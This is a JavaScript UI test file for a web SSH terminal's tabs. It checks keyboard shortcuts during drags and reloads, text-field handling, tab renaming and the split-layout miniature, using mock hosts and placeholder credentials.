  let p = await tConnect(win, 'h1.host');
  if (!needTabs(win) || !p) { cleanup(env); return; }
  for (let i = 2; i <= 10; i++) p = await tNewTab(win, 'h' + i + '.host');
  const ts = tabEls(win);
  ok(ts.length === 10, 'setup: 10 tabs; got ' + ts.length);
  ok(titleOf(ts[7]).indexOf('Alt+8') >= 0, 'tab 8 says Alt+8; got ' + show(titleOf(ts[7])));
  ok(!/Alt\+9\b/.test(titleOf(ts[8])) && !/Alt\+10/.test(titleOf(ts[9])),
     'tab 9 of 10 does not claim Alt+9 (that is the last tab), tab 10 does not claim Alt+10; got ' + show(titleOf(ts[8])) + ' / ' + show(titleOf(ts[9])));
  // Alt+9 is still "last".
  clickTab(win, ts[0]);
  await until(() => tabId(activeTab(win)) === tabId(ts[0]), 500);
  keyOn(win, win.document.body, 'Digit9', '9', {alt: true});
  ok(tabId(activeTab(win)) === tabId(ts[9]), 'Alt+9 with 10 tabs goes to the 10th, the last');
  keyOn(win, win.document.body, 'Digit8', '8', {alt: true});
  ok(tabId(activeTab(win)) === tabId(ts[7]), 'Alt+8 goes to the 8th');
  cleanup(env);
});

test('tabs keys (break): held Alt+Shift+] (autorepeat) and a burst of Alt+N leave one consistent tab in front', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry])); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const ids = [a, b, c].map(tabOfPane);
  for (let i = 0; i < 31; i++) {
    const ev = new win.KeyboardEvent('keydown', {key: '}', code: 'BracketRight', altKey: true, shiftKey: true,
      repeat: i > 0, bubbles: true, cancelable: true});
    xtermKeys(win, activePane(win)).dispatchEvent(ev);
  }
  // from C (index 2): 31 steps -> (2+31)%3 = 0
  ok(tabId(activeTab(win)) === ids[0], '31 autorepeated next-tab steps from C land on A; on #' + ids.indexOf(tabId(activeTab(win))));
  for (const d of ['2', '3', '1', '3', '2']) typeIn(win, activePane(win), 'Digit' + d, d, {alt: true});
  ok(tabId(activeTab(win)) === ids[1] && win.activeId === b.id, 'Alt+2,3,1,3,2 in a burst ends on B with B\'s pane active');
  const roots = tabRoots(win).filter(r => !env.lay.hidden(r));
  ok(roots.length === 1 && roots[0].getAttribute('data-tab') === ids[1], 'exactly one tab layout visible, B\'s; got ' + roots.length);
  await flushedThrough(win, rec, b);
  ok(!/\x1b[123}]/.test(rec.all()), 'none of it on the wire; got ' + show(rec.all()));
  cleanup(env);
});

// ---- step 4, second round: trying to break the tab keys ----
const tabKeyAt = (win, target, code, key, mods) => keyOn(win, target, code, key, Object.assign({alt: true}, mods || {}));
const paneTabsSound = win => {
  // every pane in exactly one tab root, one root visible, active pane in the active tab
  const errs = [];
  paneList(win).forEach(p => { if (!tabOfPane(p)) errs.push(p.host + ' has no tab'); });
  const vis = tabRoots(win).filter(r => !r.classList.contains('h'));
  if (vis.length !== 1) errs.push(vis.length + ' roots visible');
  if (activeTab(win) && vis[0] && vis[0].getAttribute('data-tab') !== tabId(activeTab(win))) errs.push('visible root is not the active tab');
  const ap = win.panes[win.activeId];
  if (ap && tabOfPane(ap) !== tabId(activeTab(win))) errs.push('active pane ' + ap.host + ' is not in the active tab');
  if (tabEls(win).length !== tabRoots(win).length) errs.push('tabs ' + tabEls(win).length + ' vs roots ' + tabRoots(win).length);
  return errs;
};

// While a tab or pane drag is in progress the tab keys do nothing: they
// are still consumed (never reach the shell) and the drag goes on
// unchanged - the zone stays where it was, the release does what it
// would have done without the key.
test('tabs keys (break): during a tab drag Alt+N / Alt+W / Alt+T / Alt+Shift+] do nothing; the drop still works', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), null, S3); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tC = tabOfPane(c);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const modal = confirmCounter(win);
  let zone = null, zoneAfter = null, state = null;
  const evs = [];
  dragTabOnto(win, tabById(win, tC), a, 'right', {beforeUp: () => {
    zone = zoneOf(a);
    evs.push(typeIn(win, a, 'Digit2', '2', {alt: true}));            // from the terminal (focus stays there)
    evs.push(tabKeyAt(win, win.document.body, 'Digit3', '3'));
    evs.push(typeIn(win, a, 'BracketRight', '}', {alt: true, shift: true}));
    evs.push(typeIn(win, a, 'Digit9', '9', {alt: true}));
    evs.push(typeIn(win, a, 'KeyW', 'w', {alt: true}));
    evs.push(typeIn(win, a, 'KeyT', 't', {alt: true}));
    zoneAfter = zoneOf(a);
    state = {front: tabId(activeTab(win)), tabs: tabEls(win).length, form: !hidden($(win, 'ov')),
             confirm: modal.opened, dragging: !!win.document.querySelector('.dragging')};
  }});
  await sleep(50);
  ok(zone === 'right', 'setup: zone shown on A; got ' + show(zone));
  ok(state.front === tA && state.tabs === 3 && !state.form && state.confirm === 0,
     'mid-drag Alt+2/3/Shift+]/9/W/T: no switch, no close, no form, no confirm; got ' +
     show({front: state.front === tA ? 'A' : state.front, tabs: state.tabs, form: state.form, confirm: state.confirm}));
  ok(evs.every(e => e.defaultPrevented), 'all consumed; prevented: ' + show(evs.map(e => e.defaultPrevented)));
  ok(zoneAfter === 'right' && state.dragging, 'the drag goes on unchanged: zone still "right", tab still dragging; got ' +
     show(zoneAfter) + '/' + state.dragging);
  ok(show(shapesNow(win)) === show(['(h a.host c.host)', 'b.host']),
     'the release merged C to the right of A as it would without the keys; got ' + show(shapesNow(win)));
  ok(anyZone(win) === 0 && !win.document.querySelector('.dragging') && layoutProblems(win).length === 0 &&
     paneTabsSound(win).length === 0, 'nothing left behind: ' + show(layoutProblems(win).concat(paneTabsSound(win))));
  await flushedThrough(win, rec, a);
  ok(!/\x1b[0-9tw}]/.test(rec.all()), 'none of the keys reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys (break): during a pane-bar drag Alt+N does nothing; the drop on the strip still makes a tab', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), null, S3); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !needMove(win) || !a || !b) { cleanup(env); return; }
  const c = await tNewTab(win, 'c.host');
  clickTab(win, tabElOfPane(win, a));
  await until(() => tabId(activeTab(win)) === tabOfPane(a), 500);
  const tA = tabOfPane(a);
  const spy = sessionSpy(win, [a, b, c]);
  const m = pointer(win);
  const [x0, y0] = centre(labelEl(b));
  m.down(labelEl(b), x0, y0);
  m.move(labelEl(b), x0 + 20, y0 + 20);
  m.move($(win, 'tabs'), x0 + 40, y0);
  const e1 = typeIn(win, b, 'Digit2', '2', {alt: true});
  const e2 = tabKeyAt(win, win.document.body, 'BracketRight', '}', {shift: true});
  ok(tabId(activeTab(win)) === tA && tabEls(win).length === 2, 'mid pane-drag Alt+2 / Alt+Shift+] switch nothing');
  ok(e1.defaultPrevented && e2.defaultPrevented, 'and are consumed');
  m.move($(win, 'tabs'), x0 + 42, y0);
  m.up($(win, 'tabs'), x0 + 42, y0);
  await until(() => tabEls(win).length === 3, 500);
  ok(tabEls(win).length === 3 && panesOfTab(win, tabOfPane(b)).length === 1 && tabOfPane(b) !== tA,
     'the drop on the strip still made b a tab of its own; tabs ' + tabEls(win).length);
  ok(b.sid === 'sid-b.host' && spy.length === 0, 'same session, nothing restarted; got ' + show(spy));
  ok(layoutProblems(win).length === 0 && paneTabsSound(win).length === 0,
     'layout sound: ' + show(layoutProblems(win).concat(paneTabsSound(win))));
  await flushedThrough(win, rec, b);
  ok(!/\x1b[0-9}]/.test(rec.all()), 'nothing reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys (break): Alt+W on a tab whose pane is still connecting after a reload', async () => {
  const rec = h => ({label: 'u@' + h, via: 'manual', host: h, port: 22, user: 'u', auth: 'pw',
                     persistent: false, slot_id: null, tmux_cmd: 'tmux', cols: 80, rows: 24});
  const pre = {local: {websh_panes: JSON.stringify({version: 2,
    layout: {type: 'leaf', pane: 'p1'}, panes: {p1: rec('a.host')}})},
    session: {websh_panes_session: JSON.stringify({p1: {password: 'pw-a.host'}})}};
  const env0 = await mkTabEnv(TAB_PLAN(), pre); const w0 = env0.win;
  await until(() => paneList(w0).some(p => p.sid), 2000);
  if (!needTabs(w0)) { cleanup(env0); return; }
  const b0 = await tNewTab(w0, 'b.host');
  if (!b0) { ok(false, 'setup'); cleanup(env0); return; }
  const snap = snapshotStorage(w0);                 // B in front
  cleanup(env0);
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'b.host', response: {session_id: 'sid-b-late', alive: true}, delay: 300},
  ]), snap);
  const win = env.win;
  await until(() => tabEls(win).length === 2, 1500);
  const b = paneList(win).find(p => p.host === 'b.host');
  ok(!!b && !b.sid && b.connecting && tabId(activeTab(win)) === tabOfPane(b), 'setup: B in front, still connecting');
  if (!b) { cleanup(env); return; }
  const ev = typeIn(win, b, 'KeyW', 'w', {alt: true});
  ok(ev.defaultPrevented, 'Alt+W consumed');
  await until(() => tabEls(win).length === 1, 500);
  ok(tabEls(win).length === 1, 'B closed by Alt+W while connecting');
  await until(() => disconnectsFor(env, 'sid-b-late').length > 0, 1000);
  await sleep(50);
  ok(disconnectsFor(env, 'sid-b-late').length === 1, 'the late session is disconnected once');
  ok(tabEls(win).length === 1 && tabRoots(win).length === 1 && paneList(win).length === 1, 'nothing came back');
  ok(hidden($(win, 'ov')) && paneTabsSound(win).length === 0, 'A in front, no form; ' + show(paneTabsSound(win)));
  cleanup(env);
});

test('tabs keys (break): Alt+T twice in a row opens one form; connecting makes one tab', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const modal = (() => { const el = $(win, 'ov'); const c = {opened: 0}; let was = !hidden(el);
    new win.MutationObserver(() => { const n = !hidden(el); if (n && !was) c.opened++; was = n; })
      .observe(el, {attributes: true, attributeFilter: ['class']}); return c; })();
  const e1 = typeIn(win, a, 'KeyT', 't', {alt: true});
  const e2 = typeIn(win, a, 'KeyT', 't', {alt: true});     // same tick, before anything renders
  const e3 = keyOn(win, win.document.activeElement || win.document.body, 'KeyT', 't', {alt: true});
  await until(() => !hidden($(win, 'ov')), 500);
  await sleep(30);
  ok(modal.opened === 1 && win.overlayMode === 'tab', 'one form, for a new tab; opened ' + modal.opened + ', mode ' + win.overlayMode);
  ok(e1.defaultPrevented, 'the first Alt+T consumed');
  void e2; void e3;
  const b = await tConnect(win, 'b.host');
  await until(() => tabEls(win).length === 2, 500);
  await sleep(50);
  ok(!!b && tabEls(win).length === 2 && paneList(win).length === 2, 'exactly one new tab; got ' + tabEls(win).length + ' tabs');
  ok(hidden($(win, 'ov')), 'no second form left over');
  cleanup(env);
});

// A text field outside a terminal (any input/textarea/contenteditable
// that is not xterm's helper textarea) is left alone: no tab key acts
// there and nothing is prevented, so every Alt/Option character types.
async function textFieldRule(env, field, label, tB) {
  const win = env.win;
  if (!hidden($(win, 'ov'))) win.cancelConnect();
  if (!hidden($(win, 'confirmOv'))) win.confirmCancel();
  if (tabId(activeTab(win)) !== tB && tabById(win, tB)) { clickTab(win, tabById(win, tB)); await until(() => tabId(activeTab(win)) === tB, 500); }
  try { field.focus(); } catch (e) {}
  const keys = [['Digit1', '¡'], ['Digit2', '™'], ['Digit9', 'ª'], ['KeyT', '†'], ['KeyW', '∑']].map(k => [k[0], k[1], {}]);
  keys.push(['BracketLeft', '”', {shift: true}], ['BracketRight', '’', {shift: true}]);
  const did = [], prevented = [];
  keys.forEach(k => {
    const ev = tabKeyAt(win, field, k[0], k[1], k[2]);
    const name = k[0] + (k[2].shift ? '+shift' : '');
    if (ev.defaultPrevented) prevented.push(name);
    if (tabId(activeTab(win)) !== tB || tabEls(win).length !== 2 || !hidden($(win, 'confirmOv')) ||
        !hidden($(win, 'ov'))) {
      did.push(name);
      if (!hidden($(win, 'ov'))) win.cancelConnect();
      if (!hidden($(win, 'confirmOv'))) win.confirmCancel();
      if (tabById(win, tB)) clickTab(win, tabById(win, tB));
    }
  });
  await sleep(20);
  if (!hidden($(win, 'ov'))) win.cancelConnect();
  if (tabId(activeTab(win)) !== tB && tabById(win, tB)) { clickTab(win, tabById(win, tB)); await until(() => tabId(activeTab(win)) === tB, 500); }
  ok(did.length === 0, label + ': Alt+1/2/9/T/W/Shift+[/Shift+] did nothing (no switch, close, form); acted: ' + show(did));
  ok(prevented.length === 0, label + ': none prevented, so the characters type; prevented: ' + show(prevented));
}

test('tabs keys (break): text fields outside a terminal (search box, file-browser filter, reconnect password, contenteditable) are left alone', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry, {action: 'ls', response: {ok: true, path: '/home/u', entries: []}}])); const win = env.win;
  const [a, b] = await (async () => { const x = await tConnect(win, 'a.host'); return [x, x && await tNewTab(win, 'b.host', {persistent: true})]; })();
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabOfPane(b);   // tmux: a wrong Alt+W asks (and is cancelled) instead of closing B
  // Search box of B.
  win.toggleSearch();
  const sb = b.el.querySelector('[data-search] input');
  ok(!!sb && !hidden(b.el.querySelector('[data-search]')), 'setup: B\'s search box open');
  if (sb) await textFieldRule(env, sb, 'search box', tB);
  if (typeof win.closeSearch === 'function') win.closeSearch();
  // File-browser filter.
  const st = {front: tabId(activeTab(win)) === tB ? 'B' : 'A', ov: !hidden($(win, 'ov')), confirm: !hidden($(win, 'confirmOv')),
              fbOv: !hidden($(win, 'fbOv')), bsid: b.sid};
  win.showFileBrowser(b.id);
  await until(() => !hidden($(win, 'fbOv')), 500);
  const ff = $(win, 'fbFilter');
  ok(!hidden($(win, 'fbOv')) && !!ff, 'setup: file browser open with its filter field; before: ' + show(st));
  if (ff) await textFieldRule(env, ff, 'file-browser filter', tB);
  win.closeFb();
  await until(() => hidden($(win, 'fbOv')), 500);
  // Reconnect password field.
  const pw = b.el.querySelector('input.reconnect-pw');
  ok(!!pw, 'setup: B has a reconnect password field');
  if (pw) { pw.classList.remove('h'); await textFieldRule(env, pw, 'reconnect password', tB); pw.classList.add('h'); }
  // A contenteditable outside a terminal.
  const ce = win.document.createElement('div');
  ce.setAttribute('contenteditable', 'true');
  win.document.body.appendChild(ce);
  await textFieldRule(env, ce, 'contenteditable', tB);
  ce.remove();
  // Back in B's terminal the keys work again.
  const ev = typeIn(win, b, 'Digit1', '1', {alt: true});
  ok(tabId(activeTab(win)) === tabOfPane(a) && ev.defaultPrevented, 'back in a terminal Alt+1 switches again');
  await flushedThrough(win, rec, a);
  ok(!/\x1b[0-9tw{}]|[¡™ª†∑”’]/.test(rec.all()), 'nothing reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

test('tabs keys (break): Ctrl+Tab, Ctrl+V and Ctrl+Shift+F still do their jobs from inside the terminal', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), {local: {websh_settings: JSON.stringify({ctrlVPaste: true})}}); const win = env.win;
  const [a1, a2] = await splitTabEnv(win, ['a1.host', 'a2.host']);
  if (!needTabs(win) || !a2) { ok(false, 'setup'); cleanup(env); return; }
  const was = win.activeId;
  // Ctrl+Tab at document level, like the existing test (xterm does not stop it: Tab with ctrl)
  win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Tab', code: 'Tab', ctrlKey: true, bubbles: true, cancelable: true}));
  ok(win.activeId !== was && [a1.id, a2.id].includes(win.activeId), 'Ctrl+Tab cycles to the other pane');
  const p = activePane(win);
  // Ctrl+V: declined to xterm (custom handler false), as before.
  const ev = new win.KeyboardEvent('keydown', {key: 'v', code: 'KeyV', ctrlKey: true, bubbles: true, cancelable: true});
  const r = p.term._customKey ? p.term._customKey(ev) : null;
  const expectPaste = win._ctrlVShouldPaste ? win._ctrlVShouldPaste(ev) : null;
  ok(r === !expectPaste, 'Ctrl+V: the custom key handler answers as _ctrlVShouldPaste says (paste=' + expectPaste + ', handler=' + r + ')');
  // Alt+V is not a tab key: handler lets xterm have it.
  const ev2 = new win.KeyboardEvent('keydown', {key: 'v', code: 'KeyV', altKey: true, bubbles: true, cancelable: true});
  ok(p.term._customKey(ev2) === true && !ev2.defaultPrevented, 'Alt+V goes to xterm untouched');
  // Ctrl+Shift+F opens the search box of the active pane.
  win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'F', code: 'KeyF', ctrlKey: true, shiftKey: true, bubbles: true, cancelable: true}));
  const sb = p.el.querySelector('[data-search]');
  ok(!!sb && !hidden(sb), 'Ctrl+Shift+F opens the active pane\'s search');
  cleanup(env);
});

// =====================================================================
// Tab names, the layout miniature, putting a pane or a tab back into
// another tab (spring-loaded tabs, the tab menu, a pane's "Move to tab").
//
// The DOM hooks these tests rely on:
//   rename   a double-click (dblclick) on a tab's .tab-label opens an
//            <input> inside that .tab, holding the title, all of it
//            selected and focused. Enter or blur saves, Escape cancels.
//            A name shows in .tab-label and in the .tab's title.
//   marker   .tab-split holds an <svg> with a viewBox and one
//            <rect data-pane="<pane id>" x y width height> per pane, laid
//            out as the tab's splits (split-h side by side, split-v one
//            above the other); the rect of the tab's active pane has
//            class "on". The tooltip (title of .tab-split) says "N panes".
//            Hidden (or no rects) with one pane.
//   menus    [role="menu"] holding [role="menuitem"] items, by their
//            text: "Rename", "Move into tab" (opens a list of the other
//            tabs, one item per tab, by its title: click, Enter or
//            ArrowRight on it), "Close". A right-click (contextmenu) on
//            a tab opens it. A closed menu is hidden or removed.
//            A pane's "Move to tab" is a button [data-act="move-to"] in
//            its bar and in #paneTools (a lone pane); it opens a menu of
//            the other tabs the same way.
//   merging  "Move into tab" puts the whole layout right of the target
//            tab's active pane (as movePaneToTab does for one pane), and
//            shows that tab.
//   spring   while a tab or a pane label is dragged (mouse events, as
//            today), the pointer resting ~500 ms over another tab of the
//            strip (elementFromPoint / the event target is in that .tab)
//            shows that tab; the drag goes on.
// =====================================================================
KEYCODES.Escape = 27; KEYCODES.ArrowDown = 40; KEYCODES.ArrowUp = 38;
const S4 = {barRows: BAR};
function markerSays(sm, n) {
  const t = (sm && (sm.getAttribute('title') || sm.getAttribute('aria-label'))) || '';
  return new RegExp('(^|\\D)' + n + ' panes').test(t);
}
// ---- rename ----
const renameField = t => t ? t.querySelector('input') : null;
// What a browser sends for a double click on the title.
function dblTab(win, t) {
  const l = t.querySelector('.tab-label') || t;
  for (let i = 1; i <= 2; i++) {
    l.dispatchEvent(new win.MouseEvent('mousedown', {bubbles: true, cancelable: true, button: 0, buttons: 1, detail: i}));
    l.dispatchEvent(new win.MouseEvent('mouseup', {bubbles: true, cancelable: true, button: 0, buttons: 0, detail: i}));
    l.dispatchEvent(new win.MouseEvent('click', {bubbles: true, cancelable: true, button: 0, detail: i}));
  }
  const ev = new win.MouseEvent('dblclick', {bubbles: true, cancelable: true, button: 0, detail: 2});
  l.dispatchEvent(ev);
  return ev;
}
function typeName(win, inp, v) { inp.value = v; inp.dispatchEvent(new win.Event('input', {bubbles: true})); }
function blurField(win, inp) {
  if (win.document.activeElement === inp) inp.blur();
  else {
    inp.dispatchEvent(new win.FocusEvent('blur'));
    inp.dispatchEvent(new win.FocusEvent('focusout', {bubbles: true}));
  }
}
// Rename tab element t by double-click; how: 'enter' | 'blur' | 'esc'.
async function renameTo(env, t, v, how) {
  const win = env.win;
  dblTab(win, t);
  const inp = renameField(t);
  if (!inp) return false;
  typeName(win, inp, v);
  if (how === 'blur') blurField(win, inp);
  else if (how === 'esc') keyOn(win, inp, 'Escape', 'Escape');
  else keyOn(win, inp, 'Enter', 'Enter');
  await until(() => !renameField(t), 300);
  return true;
}
function needRename(env, t) {
  dblTab(env.win, t);
  const inp = renameField(t);
  ok(!!inp, 'a double-click on the tab title opens a text field in the tab (an <input> inside .tab)');
  if (inp) keyOn(env.win, inp, 'Escape', 'Escape');
  return !!inp;
}
const tipOf = t => (t && t.getAttribute('title')) || '';
const rawManifest = win => win.localStorage.getItem(win.storageKey('websh_panes')) || '';

// ---- the miniature ----
function miniRects(t) {
  const sp = t && t.querySelector('.tab-split');
  const svg = sp && sp.querySelector('svg');
  if (!svg) return null;
  return Array.from(svg.querySelectorAll('rect[data-pane]')).map(r => ({
    el: r, pane: r.getAttribute('data-pane'), on: r.classList.contains('on'),
    x: parseFloat(r.getAttribute('x')), y: parseFloat(r.getAttribute('y')),
    w: parseFloat(r.getAttribute('width')), h: parseFloat(r.getAttribute('height'))}));
}
// A tree from rect geometry: columns first (side by side = h), else rows (v).
function geomTree(win, rs) {
  if (rs.length === 1) { const p = win.panes[rs[0].pane]; return p ? p.host : '?' + rs[0].pane; }
  const groups = (k0, k1) => {
    const s = rs.slice().sort((a, b) => a[k0] - b[k0]);
    const out = []; let end = -Infinity;
    s.forEach(r => {
      if (!out.length || r[k0] >= end - 0.01) { out.push([r]); end = r[k0] + r[k1]; }
      else { out[out.length - 1].push(r); end = Math.max(end, r[k0] + r[k1]); }
    });
    return out;
  };
  let g = groups('x', 'w');
  if (g.length > 1) return {dir: 'h', kids: g.map(x => geomTree(win, x))};
  g = groups('y', 'h');
  if (g.length > 1) return {dir: 'v', kids: g.map(x => geomTree(win, x))};
  return 'overlapping:' + rs.map(r => r.pane).join('+');
}
function domTree(win, el) {
  if (el.classList.contains('pane')) { const p = win.panes[el.getAttribute('data-pane')]; return p ? p.host : '?'; }
  const dir = el.classList.contains('split-h') ? 'h' : el.classList.contains('split-v') ? 'v' : null;
  if (!dir) return null;
  const kids = [];
  Array.from(el.children).map(c => domTree(win, c)).filter(Boolean).forEach(k => {
    if (typeof k === 'object' && k.dir === dir) kids.push.apply(kids, k.kids); else kids.push(k);
  });
  return {dir, kids};
}
const treeStr = n => typeof n === 'string' ? n : '(' + n.dir + ' ' + n.kids.map(treeStr).join(' ') + ')';
function flatShape(win, tid) {
  const root = tabRootById(win, tid);
  const top = root && Array.from(root.children).map(c => domTree(win, c)).filter(Boolean)[0];
  if (!top) return '';
  // Flatten nested same-direction splits all the way down.
  const norm = n => {
    if (typeof n === 'string') return n;
    const kids = [];
    n.kids.map(norm).forEach(k => { if (typeof k === 'object' && k.dir === n.dir) kids.push.apply(kids, k.kids); else kids.push(k); });
    return {dir: n.dir, kids};
  };
  return treeStr(norm(top));
}
// Everything wrong with tab element tEl's marker, as text.
function miniProblems(env, tEl) {
  const win = env.win;
  const tid = tabId(tEl);
  const ps = panesOfTab(win, tid);
  const sp = tEl.querySelector('.tab-split');
  const rs = miniRects(tEl);
  if (ps.length < 2) return (sp && !env.lay.hidden(sp) && rs && rs.length) ? ['a marker shown for a one-pane tab'] : [];
  const out = [];
  if (!sp || env.lay.hidden(sp)) return ['no visible .tab-split for ' + ps.length + ' panes'];
  if (!rs) return ['no <svg> miniature in .tab-split (it holds ' + show(sp.textContent) + ')'];
  const want = ps.map(p => p.id).sort(), got = rs.map(r => r.pane).sort();
  if (show(want) !== show(got)) out.push('rects for panes ' + show(got) + ', the tab has ' + show(want));
  const svg = sp.querySelector('svg');
  const vb = (svg.getAttribute('viewBox') || '').trim().split(/[\s,]+/).map(Number);
  if (vb.length !== 4 || vb.some(isNaN)) out.push('the svg has no viewBox');
  else rs.forEach(r => {
    if (![r.x, r.y, r.w, r.h].every(isFinite) || r.w <= 0 || r.h <= 0) out.push('rect ' + r.pane + ' has no size');
    else if (r.x < vb[0] - 0.01 || r.y < vb[1] - 0.01 || r.x + r.w > vb[0] + vb[2] + 0.01 || r.y + r.h > vb[1] + vb[3] + 0.01)
      out.push('rect ' + r.pane + ' outside the viewBox');
  });
  if (!out.length) {
    const g = treeStr(geomTree(win, rs)), d = flatShape(win, tid);
    if (g !== d) out.push('drawn as ' + g + ', the tab is ' + d);
  }
  const t = win.tabById(tid);
  let act = tid === tabId(activeTab(win)) ? win.activeId : (t && t.lastActive);
  if (!ps.some(p => p.id === act)) act = ps[0].id;
  const on = rs.filter(r => r.on).map(r => r.pane);
  if (show(on) !== show([act])) out.push('highlighted ' + show(on) + ', the active pane is ' + act);
  if (!markerSays(sp, ps.length)) out.push('tooltip ' + show(sp.getAttribute('title')) + ' does not say "' + ps.length + ' panes"');
  return out;
}
const allMiniProblems = env => tabEls(env.win).reduce((o, t) => o.concat(miniProblems(env, t).map(x => tabId(t) + ': ' + x)), []);

// ---- spring-loaded tabs ----
function everActive(win, tEl) {
  const st = {hit: false};
  const mo = new win.MutationObserver(() => { if (tEl.classList.contains('active')) st.hit = true; });
  mo.observe(tEl, {attributes: true, attributeFilter: ['class']});
  st.stop = () => mo.disconnect();
  return st;
}
// Press on tab tEl and move far enough to make it a drag.
function grabTab(win, tEl) {
  const m = pointer(win);
  const [x0, y0] = centre(tEl);
  m.down(tEl, x0, y0);
  m.move(tEl, x0 + 2, y0 + 30);
  return m;
}
function grabPane(win, p) {
  const m = pointer(win);
  const g = labelEl(p);
  const [x0, y0] = centre(g);
  m.down(g, x0, y0);
  m.move(g, x0 + 3, y0 + 3);
  m.move($(win, 'tabs'), x0 + 40, y0 + 2);
  return m;
}
// Rest the pointer over element el (one move, then still) until fn().
async function restOver(win, m, el, fn, ms, jitter) {
  const lab = el.querySelector('.tab-label') || el;
  const [x, y] = centre(el);
  m.move(lab, x, y);
  const t0 = _now();
  let i = 0;
  while (_now() - t0 < (ms || 1500)) {
    if (fn()) return true;
    await sleep(jitter ? 100 : 10);
    if (jitter) { i++; m.move(lab, x + (i % 2 ? 2 : -2), y + (i % 2 ? 1 : -1)); }
  }
  return !!fn();
}
function overEdge(m, p, side) {
  const [x, y] = edgePoint(p.el, side);
  const into = p.el.querySelector('.pane-term') || p.el;
  m.move(into, x, y);
  m.move(into, x + (side === 'right' ? -1 : 1), y);
  return () => m.up(into, x, y);
}
function outside(win, m, noButton) {
  const body = win.document.body;
  if (noButton) { m.moveNoButton(body, -20, 10); return; }
  m.move(body, -20, 10);
  m.up(body, -20, 10);
}
const noDragLeft = win => !win.document.querySelector('.dragging') && !win.document.body.classList.contains('pane-moving');

// ---- menus ----
function rightClick(win, el) {
  const o = {bubbles: true, cancelable: true, button: 2, buttons: 2, clientX: 10, clientY: 10, view: win};
  el.dispatchEvent(new win.MouseEvent('mousedown', o));
  el.dispatchEvent(new win.MouseEvent('mouseup', Object.assign({}, o, {buttons: 0})));
  const ev = new win.MouseEvent('contextmenu', o);
  el.dispatchEvent(ev);
  return ev;
}
const tabMenu = (win, t) => rightClick(win, t.querySelector('.tab-label') || t);
const openMenus = env => visibleAll(env, '[role="menu"]');
const itemsShown = env => visibleAll(env, '[role="menu"] [role="menuitem"]');
const itemText = el => (el.textContent || '').replace(/\s+/g, ' ').trim();
const findItem = (env, re) => itemsShown(env).find(e => re.test(itemText(e)));
const MAIN_ITEMS = /^(Rename|Move (into|to) tab|Close)\b/i;
const targetItems = env => itemsShown(env).filter(e => !MAIN_ITEMS.test(itemText(e)));
const isItem = el => !!el && !!el.getAttribute && el.getAttribute('role') === 'menuitem';
// Open the "Move into tab" / "Move to tab" list and choose `name`.
async function chooseTarget(env, parentRe, name) {
  const win = env.win;
  if (parentRe) {
    const p = findItem(env, parentRe);
    if (!p) return 'no menu item ' + parentRe + ' among ' + show(itemsShown(env).map(itemText));
    press(win, p);
  }
  await until(() => targetItems(env).some(e => itemText(e).indexOf(name) >= 0), 300);
  const it = targetItems(env).find(e => itemText(e).indexOf(name) >= 0);
  if (!it) return 'no item ' + show(name) + ' in the list; shown: ' + show(itemsShown(env).map(itemText));
  press(win, it);
  return null;
}
const keyAt = (win, code, key, mods) => keyOn(win, win.document.activeElement || win.document.body, code, key, mods);

// =====================================================================
// Feature 1: a tab's own name
// =====================================================================
test('tab name: a double-click on the title edits it in place, all selected; Enter saves it into the tab and its tooltip', async () => {
  const rec = inputRecorder();
  const env = await mkTabEnv(TAB_PLAN([rec.entry]), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const t = activeTab(win);
  const auto = tabLabel(t);
  const connects = env.log.filter(e => e.action === 'connect').length;
  dblTab(win, t);
  const inp = renameField(t);
  ok(!!inp && !env.lay.hidden(inp), 'a double-click on the tab\'s title opens a text field inside the tab');
  if (!inp) { cleanup(env); return; }
  ok(inp.value === auto, 'the field holds the current title ' + show(auto) + '; got ' + show(inp.value));
  ok(win.document.activeElement === inp, 'the field has the keyboard focus; focus is on ' +
     (win.document.activeElement ? win.document.activeElement.tagName + '.' + win.document.activeElement.className : 'nothing'));
  ok(inp.selectionStart === 0 && inp.selectionEnd === inp.value.length && inp.value.length > 0,
     'the whole title is selected; got ' + inp.selectionStart + '..' + inp.selectionEnd + ' of ' + inp.value.length);
  ok(tabEls(win).length === 1 && noDragLeft(win), 'the double-click neither dragged nor closed anything');
  const kx = keyOn(win, inp, 'KeyX', 'x');
  ok(!kx.defaultPrevented, 'a plain key in the field is not swallowed (it types)');
  typeName(win, inp, 'build box');
  keyOn(win, inp, 'Enter', 'Enter');
  await until(() => !renameField(t), 300);
  ok(!renameField(t), 'Enter closes the field');
  ok(tabLabel(t) === 'build box', 'the tab shows the new name; got ' + show(tabLabel(t)));
  ok(/build box/.test(tipOf(t)), 'its tooltip too; got ' + show(tipOf(t)));
  ok(hidden($(win, 'ov')) && env.log.filter(e => e.action === 'connect').length === connects,
     'Enter in the field opened no login form and connected nothing');
  await sleep(60);
  ok(rec.all() === '', 'nothing typed in the field reached a shell; got ' + show(rec.all()));
  cleanup(env);
});

